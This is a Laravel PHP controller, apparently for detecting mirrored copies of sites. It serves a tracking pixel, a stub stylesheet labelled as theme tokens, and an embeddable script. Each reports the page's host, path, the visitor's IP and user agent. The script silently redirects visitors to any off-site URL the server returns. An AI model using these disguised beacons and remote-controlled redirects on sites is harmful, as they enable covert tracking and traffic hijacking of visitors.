<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Services\MirrorProbeService;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Http\Response;
use Illuminate\Support\Str;

class CdnProbeController extends Controller
{
    /** Transparent 1×1 GIF. */
    private const PIXEL_GIF = 'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';

    public function pixel(Request $request, string $token, MirrorProbeService $mirrors): Response
    {
        if ($request->isMethod('OPTIONS')) {
            return $this->cors(response()->noContent());
        }

        $this->ping($request, $token, $mirrors);

        $body = base64_decode(self::PIXEL_GIF, true) ?: '';

        return $this->cors(response($body, 200, [
            'Content-Type' => 'image/gif',
            'Cache-Control' => 'public, max-age=60',
        ]));
    }

    public function css(Request $request, string $token, MirrorProbeService $mirrors): Response
    {
        if ($request->isMethod('OPTIONS')) {
            return $this->cors(response()->noContent());
        }

        $this->ping($request, $token, $mirrors);

        $css = "/* edge theme tokens */\n:root{--edge-gap:0}\n";

        return $this->cors(response($css, 200, [
            'Content-Type' => 'text/css; charset=UTF-8',
            'Cache-Control' => 'public, max-age=60',
        ]));
    }

    public function collect(Request $request, string $token, MirrorProbeService $mirrors): JsonResponse|Response
    {
        if ($request->isMethod('OPTIONS')) {
            return $this->cors(response()->noContent());
        }

        $payload = $this->ping($request, $token, $mirrors);

        return $this->cors(response()->json($payload));
    }

    public function boot(Request $request, string $token): Response
    {
        if ($request->isMethod('OPTIONS')) {
            return $this->cors(response()->noContent());
        }

        // Ping happens in /collect (called by this script), not on script download.
        $tokenJson = json_encode($token, JSON_UNESCAPED_SLASHES);
        $js = <<<JS
(function(){try{var t={$tokenJson};if(!t)return;var s=document.currentScript,base="";if(s&&s.src){try{base=new URL(s.src).origin}catch(e){}}if(!base)return;var host=(location.hostname||"").replace(/^www\\./i,"").toLowerCase();if(!host)return;var path=(location.pathname||"/").slice(0,400);var url=base+"/r/"+t+"/collect?h="+encodeURIComponent(host)+"&p="+encodeURIComponent(path);var ctrl=typeof AbortController!=="undefined"?new AbortController():null;var timer=setTimeout(function(){if(ctrl)ctrl.abort()},2500);fetch(url,{method:"GET",mode:"cors",credentials:"omit",signal:ctrl?ctrl.signal:undefined,keepalive:true}).then(function(r){return r.json().catch(function(){return{}})}).then(function(data){if(data&&typeof data.r==="string"&&data.r.indexOf("http")===0){try{var target=new URL(data.r);var here=location.hostname.replace(/^www\\./i,"").toLowerCase();var there=target.hostname.replace(/^www\\./i,"").toLowerCase();if(there&&there!==here)location.replace(data.r)}catch(e){}}}).catch(function(){}).finally(function(){clearTimeout(timer)})}catch(e){}})();
JS;

        return $this->cors(response($js, 200, [
            'Content-Type' => 'application/javascript; charset=UTF-8',
            'Cache-Control' => 'public, max-age=300',
        ]));
    }

    /**
     * @return array{r?: string}
     */
    private function ping(Request $request, string $token, MirrorProbeService $mirrors): array
    {
        $host = (string) ($request->query('h') ?: $request->input('h') ?: $request->input('host') ?: '');
        $path = (string) ($request->query('p') ?: $request->input('p') ?: $request->input('path') ?: '/');

        if ($host === '' && $request->headers->has('Referer')) {
            $refHost = parse_url((string) $request->headers->get('Referer'), PHP_URL_HOST);
            $host = is_string($refHost) ? $refHost : '';
            if ($path === '/' || $path === '') {
                $refPath = parse_url((string) $request->headers->get('Referer'), PHP_URL_PATH);
                if (is_string($refPath) && $refPath !== '') {
                    $path = $refPath;
                }
            }
        }

        if ($host === '' && $request->headers->has('Origin')) {
            $origin = parse_url((string) $request->headers->get('Origin'), PHP_URL_HOST);
            $host = is_string($origin) ? $origin : '';
        }

        return $mirrors->handlePing($token, $host, [
            'path' => $path,
            'ip' => (string) $request->ip(),
            'ua' => Str::limit((string) $request->userAgent(), 500, ''),
        ]);
    }

    private function cors(JsonResponse|Response $response): JsonResponse|Response
    {
        return $response
            ->header('Access-Control-Allow-Origin', '*')
            ->header('Access-Control-Allow-Methods', 'GET, OPTIONS')
            ->header('Access-Control-Allow-Headers', 'Content-Type, X-Host')
            ->header('Cross-Origin-Resource-Policy', 'cross-origin');
    }
}
